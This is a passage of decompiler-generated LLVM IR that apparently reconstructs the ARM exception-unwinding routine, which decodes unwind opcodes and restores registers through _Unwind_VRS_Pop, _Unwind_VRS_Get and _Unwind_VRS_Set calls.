  store i1 %v2_19360, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19360, label %dec_label_pc_1939c, label %dec_label_pc_1936c

dec_label_pc_1936c:                               ; preds = %dec_label_pc_1935c
  %v1_1936c = add nsw i32 %v4_1935c, -1
  store i32 %v1_1936c, i32* %r3.global-to-local, align 4
  %v1_19370 = trunc i32 %v1_1936c to i8
  store i8 %v1_19370, i8* %v2_1935c, align 1
  %v0_19374 = load i32, i32* @r5, align 4
  %v1_19374 = add i32 %v0_19374, 4
  %v2_19374 = inttoptr i32 %v1_19374 to i32*
  %v3_19374 = load i32, i32* %v2_19374, align 4
  store i32 %v3_19374, i32* %r2.global-to-local, align 4
  %v1_19378 = inttoptr i32 %v3_19374 to i32*
  %v2_19378 = load i32, i32* %v1_19378, align 4
  store i32 %v2_19378, i32* %r0.global-to-local, align 4
  %v4_19378 = add i32 %v3_19374, 4
  store i32 %v4_19378, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19378, i32* %v2_19374, align 4
  %v0_19384 = load i32, i32* %r3.global-to-local, align 4
  %v1_19384 = trunc i32 %v0_19384 to i8
  %v2_19384 = load i32, i32* @r5, align 4
  %v3_19384 = add i32 %v2_19384, 8
  %v4_19384 = inttoptr i32 %v3_19384 to i8*
  store i8 %v1_19384, i8* %v4_19384, align 1
  %v0_19388 = load i32, i32* %r0.global-to-local, align 4
  %v1_19388 = load i32, i32* @r5, align 4
  %v2_19388 = inttoptr i32 %v1_19388 to i32*
  store i32 %v0_19388, i32* %v2_19388, align 4
  br label %dec_label_pc_1938c

dec_label_pc_1938c:                               ; preds = %.thread3, %dec_label_pc_1936c
  %v0_1938c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1938c, i32* %r3.global-to-local, align 4
  %v3_19390 = mul i32 %v0_1938c, 256
  store i32 %v3_19390, i32* %r0.global-to-local, align 4
  %v1_19394 = load i32, i32* @r5, align 4
  %v2_19394 = inttoptr i32 %v1_19394 to i32*
  store i32 %v3_19390, i32* %v2_19394, align 4
  %v0_19398 = load i32, i32* %r3.global-to-local, align 4
  %v3_19398 = udiv i32 %v0_19398, 16777216
  br label %dec_label_pc_1939c

dec_label_pc_1939c:                               ; preds = %dec_label_pc_1935c, %dec_label_pc_1938c
  %storemerge133 = phi i32 [ %v3_19398, %dec_label_pc_1938c ], [ 176, %dec_label_pc_1935c ]
  %v1_1939c = load i32, i32* %ip.global-to-local, align 4
  %v4_1939c = mul i32 %v1_1939c, 256
  %v5_1939c = or i32 %v4_1939c, %storemerge133
  store i32 %v5_1939c, i32* %r2.global-to-local, align 4
  %v7_193a0 = icmp eq i32 %v5_1939c, 32768
  store i1 %v7_193a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_193a0, label %dec_label_pc_195ac, label %dec_label_pc_193a8

dec_label_pc_193a8:                               ; preds = %dec_label_pc_1939c
  %v3_193a8 = mul i32 %v5_1939c, 16
  store i32 %v3_193a8, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_193b8 = and i32 %v3_193a8, 65520
  store i32 %v3_193b8, i32* %r2.global-to-local, align 4
  %v0_193bc = load i32, i32* @r7, align 4
  store i32 %v0_193bc, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v4_193c4 = call i32 @_Unwind_VRS_Pop(i32 %v0_193bc, i32 %v3_193b8, i32 0, i32 0)
  store i32 %v4_193c4, i32* %r0.global-to-local, align 4
  %v2_193c8 = icmp eq i32 %v4_193c4, 0
  store i1 %v2_193c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193c8, label %dec_label_pc_193d0, label %dec_label_pc_195ac

dec_label_pc_193d0:                               ; preds = %dec_label_pc_193a8
  %v0_193d0 = load i32, i32* @r5, align 4
  %v1_193d0 = add i32 %v0_193d0, 8
  %v2_193d0 = inttoptr i32 %v1_193d0 to i8*
  %v3_193d0 = load i8, i8* %v2_193d0, align 1
  %v4_193d0 = zext i8 %v3_193d0 to i32
  store i32 %v4_193d0, i32* %r3.global-to-local, align 4
  %v0_193d4 = load i32, i32* @r4, align 4
  %v1_193d4 = and i32 %v0_193d4, 32768
  %v2_193d4 = icmp eq i32 %v1_193d4, 0
  store i1 %v2_193d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193d4, label %bb148, label %bb147

bb147:                                            ; preds = %dec_label_pc_193d0
  store i32 1, i32* @sl, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_193d0, %bb147
  %v2_193dc = icmp eq i8 %v3_193d0, 0
  store i1 %v2_193dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193dc, label %dec_label_pc_193ec, label %.thread6

.thread6:                                         ; preds = %bb148
  %v2_193e0 = add nsw i32 %v4_193d0, -1
  store i32 %v2_193e0, i32* %r3.global-to-local, align 4
  %v2_193e4 = trunc i32 %v2_193e0 to i8
  store i8 %v2_193e4, i8* %v2_193d0, align 1
  %v0_193e8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_193e8.pr.pr, label %.thread6.dec_label_pc_193ec_crit_edge, label %dec_label_pc_19318

.thread6.dec_label_pc_193ec_crit_edge:            ; preds = %.thread6
  %v0_193ec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_193ec

dec_label_pc_193ec:                               ; preds = %bb148, %.thread6.dec_label_pc_193ec_crit_edge
  %v0_193ec = phi i32 [ %v0_193ec.pre, %.thread6.dec_label_pc_193ec_crit_edge ], [ %v0_193d0, %bb148 ]
  %v1_193ec = add i32 %v0_193ec, 9
  %v2_193ec = inttoptr i32 %v1_193ec to i8*
  %v3_193ec = load i8, i8* %v2_193ec, align 1
  %v4_193ec = zext i8 %v3_193ec to i32
  store i32 %v4_193ec, i32* %r3.global-to-local, align 4
  %v2_193f0 = icmp eq i8 %v3_193ec, 0
  store i1 %v2_193f0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193f0, label %dec_label_pc_193f8, label %dec_label_pc_192fc

dec_label_pc_193f8:                               ; preds = %dec_label_pc_193ec, %dec_label_pc_192f0, %dec_label_pc_19318
  %v0_193f8 = load i32, i32* @sl, align 4
  %v2_193f8 = icmp eq i32 %v0_193f8, 0
  store i1 %v2_193f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_193f8, label %dec_label_pc_194c0, label %bb149

bb149:                                            ; preds = %dec_label_pc_193f8
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19404

dec_label_pc_19404:                               ; preds = %bb149, %dec_label_pc_19974, %dec_label_pc_19814, %dec_label_pc_19638, %dec_label_pc_195f0, %dec_label_pc_195ac, %dec_label_pc_194c0
  %v1_1940c = phi i32 [ 0, %bb149 ], [ 9, %dec_label_pc_19974 ], [ 9, %dec_label_pc_19814 ], [ 9, %dec_label_pc_19638 ], [ 9, %dec_label_pc_195f0 ], [ 9, %dec_label_pc_195ac ], [ %v0_194f4, %dec_label_pc_194c0 ]
  store i32 %v9_192c8, i32* %r6.global-to-local, align 4
  store i32 %v21_192c8, i32* @lr, align 4
  ret i32 %v1_1940c

dec_label_pc_19410:                               ; preds = %dec_label_pc_19334
  %v1_19410 = mul i32 %v0_19334, 4
  %v3_19414 = and i32 %v1_19410, 252
  store i32 %v3_19414, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19420 = load i32, i32* @r7, align 4
  store i32 %v0_19420, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  %v1_19428 = add nuw nsw i32 %v3_19414, 4
  store i32 %v1_19428, i32* %r6.global-to-local, align 4
  %v5_19430 = call i32 @_Unwind_VRS_Get(i32 %v0_19420, i32 13, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  %v0_19434 = load i32, i32* @r4, align 4
  %v1_19434 = and i32 %v0_19434, 64
  %v2_19434 = icmp eq i32 %v1_19434, 0
  store i1 %v2_19434, i1* %cpsr_z.global-to-local, align 1
  %v4_1943c = load i32, i32* %stack_var_-36, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_19448 = load i32, i32* %r6.global-to-local, align 4
  %tmp181 = sub i32 0, %v2_19448
  %storemerge160.p = select i1 %v2_19434, i32 %v2_19448, i32 %tmp181
  %storemerge160 = add i32 %storemerge160.p, %v4_1943c
  store i32 %storemerge160, i32* %ip.global-to-local, align 4
  %storemerge135 = load i32, i32* @r7, align 4
  store i32 %storemerge135, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %storemerge160, i32* %stack_var_-36, align 4
  %v5_19464 = call i32 @_Unwind_VRS_Set(i32 %storemerge135, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_19464, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_192dc.backedge

dec_label_pc_192dc.backedge:                      ; preds = %dec_label_pc_19410, %dec_label_pc_1948c, %dec_label_pc_19910, %dec_label_pc_195dc, %dec_label_pc_19614, %dec_label_pc_19594, %dec_label_pc_19800
  %v0_192dc.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_192dc

dec_label_pc_1946c:                               ; preds = %dec_label_pc_1933c
  %v7_1946c = icmp eq i32 %v1_1933c, 144
  store i1 %v7_1946c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1946c, label %dec_label_pc_19474, label %dec_label_pc_195b4

dec_label_pc_19474:                               ; preds = %dec_label_pc_1946c
  %v1_19474 = urem i32 %v0_19334, 16
  store i32 %v1_19474, i32* %r2.global-to-local, align 4
  %v2_19478 = icmp eq i32 %v1_19474, 15
  store i1 %v2_19478, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19478, label %.thread21, label %bb153

bb153:                                            ; preds = %dec_label_pc_19474
  %v8_1947c = icmp eq i32 %v1_19474, 13
  store i1 %v8_1947c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1947c, label %bb154, label %dec_label_pc_1948c

.thread21:                                        ; preds = %dec_label_pc_19474
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_195ac

bb154:                                            ; preds = %bb153
  store i32 1, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_195ac

dec_label_pc_1948c:                               ; preds = %bb153
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_19498 = load i32, i32* @r7, align 4
  store i32 %v0_19498, i32* %r0.global-to-local, align 4
  %v5_194a0 = call i32 @_Unwind_VRS_Get(i32 %v0_19498, i32 0, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 0, i32* %r1.global-to-local, align 4
  %v0_194a8 = load i32, i32* @r7, align 4
  store i32 %v0_194a8, i32* %r0.global-to-local, align 4
  store i32 13, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v5_194b8 = call i32 @_Unwind_VRS_Set(i32 %v0_194a8, i32 0, i32 13, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_194b8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_192dc.backedge

dec_label_pc_194c0:                               ; preds = %dec_label_pc_193f8
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_194d0 = load i32, i32* @r7, align 4
  store i32 %v0_194d0, i32* %r0.global-to-local, align 4
  %v7_194d8 = call i32 @_Unwind_VRS_Get(i32 %v0_194d0, i32 0, i32 14, i32 0, i8* %tmp146)
  %v0_194dc = load i32, i32* @r7, align 4
  store i32 %v0_194dc, i32* %r0.global-to-local, align 4
  %v0_194e0 = load i32, i32* @sl, align 4
  store i32 %v0_194e0, i32* %r1.global-to-local, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  store i32 %v0_194e0, i32* %r3.global-to-local, align 4
  %v5_194f0 = call i32 @_Unwind_VRS_Set(i32 %v0_194dc, i32 %v0_194e0, i32 15, i32 %v0_194e0, i8* bitcast (i32* @0 to i8*))
  %v0_194f4 = load i32, i32* @sl, align 4
  store i32 %v0_194f4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19404

dec_label_pc_194fc:                               ; preds = %dec_label_pc_196f0
  %v7_194fc = icmp eq i32 %v0_196f0, 199
  store i1 %v7_194fc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_194fc, label %dec_label_pc_197d0, label %dec_label_pc_19504

dec_label_pc_19504:                               ; preds = %dec_label_pc_194fc
  %v1_19504 = and i32 %v0_19334, 248
  store i32 %v1_19504, i32* %r3.global-to-local, align 4
  %v7_19508 = icmp eq i32 %v1_19504, 192
  store i1 %v7_19508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19508, label %.thread24, label %dec_label_pc_19520

.thread24:                                        ; preds = %dec_label_pc_19504
  %v2_1950c = urem i32 %v0_19334, 16
  %v2_19510 = add nuw nsw i32 %v2_1950c, 1
  store i32 3, i32* %r1.global-to-local, align 4
  %v2_19518 = or i32 %v2_19510, 655360
  store i32 %v2_19518, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_195dc

dec_label_pc_19520:                               ; preds = %dec_label_pc_19504
  %v7_19520 = icmp eq i32 %v0_196f0, 200
  store i1 %v7_19520, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19520, label %dec_label_pc_19764, label %dec_label_pc_19528

dec_label_pc_19528:                               ; preds = %dec_label_pc_19520
  %v7_19528 = icmp eq i32 %v0_196f0, 201
  store i1 %v7_19528, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19528, label %dec_label_pc_19530, label %dec_label_pc_195ac

dec_label_pc_19530:                               ; preds = %dec_label_pc_19528
  %v0_19530 = load i32, i32* @r5, align 4
  %v1_19530 = add i32 %v0_19530, 8
  %v2_19530 = inttoptr i32 %v1_19530 to i8*
  %v3_19530 = load i8, i8* %v2_19530, align 1
  %v4_19530 = zext i8 %v3_19530 to i32
  store i32 %v4_19530, i32* %r3.global-to-local, align 4
  %v2_19534 = icmp eq i8 %v3_19530, 0
  store i1 %v2_19534, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19534, label %dec_label_pc_19544, label %.thread26

.thread26:                                        ; preds = %dec_label_pc_19530
  %v2_19538 = add nsw i32 %v4_19530, -1
  store i32 %v2_19538, i32* %r3.global-to-local, align 4
  %v2_1953c = trunc i32 %v2_19538 to i8
  store i8 %v2_1953c, i8* %v2_19530, align 1
  %v0_19540.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19540.pr.pr, label %.thread26.dec_label_pc_19544_crit_edge, label %dec_label_pc_19578

.thread26.dec_label_pc_19544_crit_edge:           ; preds = %.thread26
  %v0_19544.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_19544

dec_label_pc_19544:                               ; preds = %.thread26.dec_label_pc_19544_crit_edge, %dec_label_pc_19530
  %v2_1955c = phi i32 [ %v0_19544.pre, %.thread26.dec_label_pc_19544_crit_edge ], [ %v0_19530, %dec_label_pc_19530 ]
  %v1_19544 = add i32 %v2_1955c, 9
  %v2_19544 = inttoptr i32 %v1_19544 to i8*
  %v3_19544 = load i8, i8* %v2_19544, align 1
  %v4_19544 = zext i8 %v3_19544 to i32
  store i32 %v4_19544, i32* %r3.global-to-local, align 4
  %v2_19548 = icmp eq i8 %v3_19544, 0
  store i1 %v2_19548, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19548, label %dec_label_pc_19594, label %dec_label_pc_19558

dec_label_pc_19558:                               ; preds = %dec_label_pc_19544
  %v1_19558 = add nsw i32 %v4_19544, -1
  store i32 %v1_19558, i32* %r3.global-to-local, align 4
  %v1_1955c = trunc i32 %v1_19558 to i8
  store i8 %v1_1955c, i8* %v2_19544, align 1
  %v0_19560 = load i32, i32* @r5, align 4
  %v1_19560 = add i32 %v0_19560, 4
  %v2_19560 = inttoptr i32 %v1_19560 to i32*
  %v3_19560 = load i32, i32* %v2_19560, align 4
  store i32 %v3_19560, i32* %r2.global-to-local, align 4
  %v1_19564 = inttoptr i32 %v3_19560 to i32*
  %v2_19564 = load i32, i32* %v1_19564, align 4
  store i32 %v2_19564, i32* %r0.global-to-local, align 4
  %v4_19564 = add i32 %v3_19560, 4
  store i32 %v4_19564, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_19564, i32* %v2_19560, align 4
  %v0_19570 = load i32, i32* %r3.global-to-local, align 4
  %v1_19570 = trunc i32 %v0_19570 to i8
  %v2_19570 = load i32, i32* @r5, align 4
  %v3_19570 = add i32 %v2_19570, 8
  %v4_19570 = inttoptr i32 %v3_19570 to i8*
  store i8 %v1_19570, i8* %v4_19570, align 1
  %v0_19574 = load i32, i32* %r0.global-to-local, align 4
  %v1_19574 = load i32, i32* @r5, align 4
  %v2_19574 = inttoptr i32 %v1_19574 to i32*
  store i32 %v0_19574, i32* %v2_19574, align 4
  br label %dec_label_pc_19578

dec_label_pc_19578:                               ; preds = %.thread26, %dec_label_pc_19558
  %v0_19578 = load i32, i32* %r0.global-to-local, align 4
  %v3_19578 = udiv i32 %v0_19578, 16777216
  %v1_1957c = urem i32 %v3_19578, 16
  %v3_19580 = mul i32 %v0_19578, 256
  %v1_19584 = add nuw nsw i32 %v1_1957c, 1
  store i32 %v1_19584, i32* %r1.global-to-local, align 4
  %v1_19588 = and i32 %v3_19578, 240
  store i32 %v1_19588, i32* %r3.global-to-local, align 4
  %v1_1958c = load i32, i32* @r5, align 4
  %v2_1958c = inttoptr i32 %v1_1958c to i32*
  store i32 %v3_19580, i32* %v2_1958c, align 4
  %v0_19590 = load i32, i32* %r1.global-to-local, align 4
  %v1_19590 = load i32, i32* %r3.global-to-local, align 4
  %v4_19590 = mul i32 %v1_19590, 4096
  %v5_19590 = or i32 %v4_19590, %v0_19590
  br label %dec_label_pc_19594

dec_label_pc_19594:                               ; preds = %dec_label_pc_19544, %dec_label_pc_19578
  %storemerge = phi i32 [ %v5_19590, %dec_label_pc_19578 ], [ 720897, %dec_label_pc_19544 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v0_19594 = load i32, i32* @r7, align 4
  store i32 %v0_19594, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_195a0 = call i32 @_Unwind_VRS_Pop(i32 %v0_19594, i32 1, i32 5, i32 5)
  store i32 %v4_195a0, i32* %r0.global-to-local, align 4
  %v2_195a4 = icmp eq i32 %v4_195a0, 0
  store i1 %v2_195a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195a4, label %dec_label_pc_192dc.backedge, label %dec_label_pc_195ac

dec_label_pc_195ac:                               ; preds = %dec_label_pc_197f8, %dec_label_pc_19528, %dec_label_pc_19608, %dec_label_pc_199ac, %dec_label_pc_1997c, %dec_label_pc_19958, %dec_label_pc_197e4, %dec_label_pc_19594, %dec_label_pc_193a8, %dec_label_pc_1939c, %bb154, %.thread21
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19404

dec_label_pc_195b4:                               ; preds = %dec_label_pc_1946c
  %v7_195b4 = icmp eq i32 %v1_1933c, 160
  store i1 %v7_195b4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_195b4, label %dec_label_pc_195bc, label %dec_label_pc_195f8

dec_label_pc_195bc:                               ; preds = %dec_label_pc_195b4
  %v0_195bc = load i32, i32* %ip.global-to-local, align 4
  %v1_195bc = urem i32 %v0_195bc, 8
  %v1_195c0 = xor i32 %v1_195bc, 7
  store i32 %v1_195c0, i32* %r3.global-to-local, align 4
  %v6_195c8 = lshr i32 4080, %v1_195c0
  %v1_195cc = and i32 %v0_19334, 8
  %v2_195cc = icmp eq i32 %v1_195cc, 0
  store i1 %v2_195cc, i1* %cpsr_z.global-to-local, align 1
  %v1_195d0 = and i32 %v6_195c8, 4080
  %tmp155 = mul nuw nsw i32 %v1_195cc, 2048
  %tmp156 = or i32 %v1_195d0, %tmp155
  store i32 %tmp156, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_195dc

dec_label_pc_195dc:                               ; preds = %.thread44, %.thread24, %dec_label_pc_1996c.dec_label_pc_195dc_crit_edge, %bb157, %dec_label_pc_197c8, %dec_label_pc_1975c, %dec_label_pc_196bc, %dec_label_pc_195bc
  %v2_195e4 = phi i32 [ %v2_196e0, %.thread44 ], [ %v2_196e8, %bb157 ], [ %v2_195e4.pre, %dec_label_pc_1996c.dec_label_pc_195dc_crit_edge ], [ %v2_19518, %.thread24 ], [ %storemerge130, %dec_label_pc_197c8 ], [ %storemerge131, %dec_label_pc_1975c ], [ %storemerge132, %dec_label_pc_196bc ], [ %tmp156, %dec_label_pc_195bc ]
  %v0_195e0 = phi i32 [ 2, %.thread44 ], [ 1, %bb157 ], [ 0, %dec_label_pc_1996c.dec_label_pc_195dc_crit_edge ], [ 3, %.thread24 ], [ 2, %dec_label_pc_197c8 ], [ 3, %dec_label_pc_1975c ], [ 1, %dec_label_pc_196bc ], [ 0, %dec_label_pc_195bc ]
  %v0_195dc = load i32, i32* @r7, align 4
  store i32 %v0_195dc, i32* %r0.global-to-local, align 4
  store i32 %v0_195e0, i32* %r3.global-to-local, align 4
  %v4_195e4 = call i32 @_Unwind_VRS_Pop(i32 %v0_195dc, i32 %v0_195e0, i32 %v2_195e4, i32 %v0_195e0)
  store i32 %v4_195e4, i32* %r0.global-to-local, align 4
  %v2_195e8 = icmp eq i32 %v4_195e4, 0
  store i1 %v2_195e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_195e8, label %dec_label_pc_192dc.backedge, label %dec_label_pc_195f0

dec_label_pc_195f0:                               ; preds = %dec_label_pc_195dc
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19404

dec_label_pc_195f8:                               ; preds = %dec_label_pc_195b4
  %v7_195f8 = icmp eq i32 %v1_1933c, 176
  store i1 %v7_195f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_195f8, label %dec_label_pc_19640, label %dec_label_pc_19600

dec_label_pc_19600:                               ; preds = %dec_label_pc_195f8
  %v7_19600 = icmp eq i32 %v1_1933c, 192
  store i1 %v7_19600, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19600, label %dec_label_pc_196f0, label %dec_label_pc_19608

dec_label_pc_19608:                               ; preds = %dec_label_pc_19600
  %v1_19608 = and i32 %v0_19334, 248
  store i32 %v1_19608, i32* %r3.global-to-local, align 4
  %v7_1960c = icmp eq i32 %v1_19608, 208
  store i1 %v7_1960c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1960c, label %dec_label_pc_19614, label %dec_label_pc_195ac

dec_label_pc_19614:                               ; preds = %dec_label_pc_19608
  %v1_19614 = urem i32 %v0_19334, 8
  %v1_19618 = add nuw nsw i32 %v1_19614, 1
  %v1_1961c = or i32 %v1_19618, 524288
  store i32 %v1_1961c, i32* %r2.global-to-local, align 4
  %v0_19620 = load i32, i32* @r7, align 4
  store i32 %v0_19620, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 5, i32* %r3.global-to-local, align 4
  %v4_1962c = call i32 @_Unwind_VRS_Pop(i32 %v0_19620, i32 1, i32 %v1_1961c, i32 5)
  store i32 %v4_1962c, i32* %r0.global-to-local, align 4
  %v2_19630 = icmp eq i32 %v4_1962c, 0
  store i1 %v2_19630, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19630, label %dec_label_pc_192dc.backedge, label %dec_label_pc_19638

dec_label_pc_19638:                               ; preds = %dec_label_pc_19614
  store i32 9, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_19404

dec_label_pc_19640:                               ; preds = %dec_label_pc_195f8
  %v0_19640 = load i32, i32* %ip.global-to-local, align 4
  %v7_19640 = icmp eq i32 %v0_19640, 177
  store i1 %v7_19640, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19640, label %dec_label_pc_19944, label %dec_label_pc_19648

dec_label_pc_19648:                               ; preds = %dec_label_pc_19640
  %v7_19648 = icmp eq i32 %v0_19640, 178
  store i1 %v7_19648, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19648, label %dec_label_pc_1981c, label %dec_label_pc_19650

dec_label_pc_19650:                               ; preds = %dec_label_pc_19648
  %v7_19650 = icmp eq i32 %v0_19640, 179
  store i1 %v7_19650, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_19650, label %dec_label_pc_19658, label %dec_label_pc_196c4

dec_label_pc_19658:                               ; preds = %dec_label_pc_19650
  %v0_19658 = load i32, i32* @r5, align 4
  %v1_19658 = add i32 %v0_19658, 8
  %v2_19658 = inttoptr i32 %v1_19658 to i8*
  %v3_19658 = load i8, i8* %v2_19658, align 1
  %v4_19658 = zext i8 %v3_19658 to i32
  store i32 %v4_19658, i32* %r3.global-to-local, align 4
  %v2_1965c = icmp eq i8 %v3_19658, 0
  store i1 %v2_1965c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1965c, label %dec_label_pc_1966c, label %.thread30

.thread30:                                        ; preds = %dec_label_pc_19658
  %v2_19660 = add nsw i32 %v4_19658, -1
  store i32 %v2_19660, i32* %r3.global-to-local, align 4
  %v2_19664 = trunc i32 %v2_19660 to i8
  store i8 %v2_19664, i8* %v2_19658, align 1
  %v0_19668.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_19668.pr.pr, label %.thread30.dec_label_pc_1966c_crit_edge, label %dec_label_pc_196a0

.thread30.dec_label_pc_1966c_crit_edge:           ; preds = %.thread30
  %v0_1966c.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1966c

dec_label_pc_1966c:                               ; preds = %.thread30.dec_label_pc_1966c_crit_edge, %dec_label_pc_19658
  %v2_19684 = phi i32 [ %v0_1966c.pre, %.thread30.dec_label_pc_1966c_crit_edge ], [ %v0_19658, %dec_label_pc_19658 ]
  %v1_1966c = add i32 %v2_19684, 9
  %v2_1966c = inttoptr i32 %v1_1966c to i8*
  %v3_1966c = load i8, i8* %v2_1966c, align 1
  %v4_1966c = zext i8 %v3_1966c to i32
  store i32 %v4_1966c, i32* %r3.global-to-local, align 4
  %v2_19670 = icmp eq i8 %v3_1966c, 0
  store i1 %v2_19670, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_19670, label %dec_label_pc_196bc, label %dec_label_pc_19680

dec_label_pc_19680:                               ; preds = %dec_label_pc_1966c
  %v1_19680 = add nsw i32 %v4_1966c, -1
  store i32 %v1_19680, i32* %r3.global-to-local, align 4
  %v1_19684 = trunc i32 %v1_19680 to i8
  store i8 %v1_19684, i8* %v2_1966c, align 1
  %v0_19688 = load i32, i32* @r5, align 4
  %v1_19688 = add i32 %v0_19688, 4
  %v2_19688 = inttoptr i32 %v1_19688 to i32*
  %v3_19688 = load i32, i32* %v2_19688, align 4
  store i32 %v3_19688, i32* %r2.global-to-local, align 4
  %v1_1968c = inttoptr i32 %v3_19688 to i32*
  %v2_1968c = load i32, i32* %v1_1968c, align 4
  store i32 %v2_1968c, i32* %r0.global-to-local, align 4
  %v4_1968c = add i32 %v3_19688, 4
  store i32 %v4_1968c, i32* %r2.global-to-local, align 4
  store i32 3, i32* %r3.global-to-local, align 4
  store i32 %v4_1968c, i32* %v2_19688, align 4
  %v0_19698 = load i32, i32* %r3.global-to-local, align 4
  %v1_19698 = trunc i32 %v0_19698 to i8
  %v2_19698 = load i32, i32* @r5, align 4
  %v3_19698 = add i32 %v2_19698, 8
  %v4_19698 = inttoptr i32 %v3_19698 to i8*
  store i8 %v1_19698, i8* %v4_19698, align 1
  %v0_1969c = load i32, i32* %r0.global-to-local, align 4
  %v1_1969c = load i32, i32* @r5, align 4
  %v2_1969c = inttoptr i32 %v1_1969c to i32*
  store i32 %v0_1969c, i32* %v2_1969c, align 4
  br label %dec_label_pc_196a0

dec_label_pc_196a0:                               ; preds = %.thread30, %dec_label_pc_19680
  %v0_196a0 = load i32, i32* %r0.global-to-local, align 4
  %v3_196a0 = udiv i32 %v0_196a0, 16777216
  %v1_196a4 = urem i32 %v3_196a0, 16
  %v3_196a8 = mul i32 %v0_196a0, 256
  store i32 %v3_196a8, i32* %r0.global-to-local, align 4
  %v1_196ac = add nuw nsw i32 %v1_196a4, 1
  store i32 %v1_196ac, i32* %r2.global-to-local, align 4
  %v1_196b0 = and i32 %v3_196a0, 240
  store i32 %v1_196b0, i32* %r3.global-to-local, align 4
  %v1_196b4 = load i32, i32* @r5, align 4
  %v2_196b4 = inttoptr i32 %v1_196b4 to i32*
  store i32 %v3_196a8, i32* %v2_196b4, align 4
  %v0_196b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_196b8 = load i32, i32* %r3.global-to-local, align 4
  %v4_196b8 = mul i32 %v1_196b8, 4096
  %v5_196b8 = or i32 %v4_196b8, %v0_196b8
  br label %dec_label_pc_196bc

dec_label_pc_196bc:                               ; preds = %dec_label_pc_1966c, %dec_label_pc_196a0
  %storemerge132 = phi i32 [ %v5_196b8, %dec_label_pc_196a0 ], [ 720897, %dec_label_pc_1966c ]
  store i32 %storemerge132, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_195dc

dec_label_pc_196c4:                               ; preds = %dec_label_pc_19650
  %v1_196c4 = and i32 %v0_19334, 252
  store i32 %v1_196c4, i32* %r3.global-to-local, align 4
  %v7_196c8 = icmp eq i32 %v1_196c4, 180
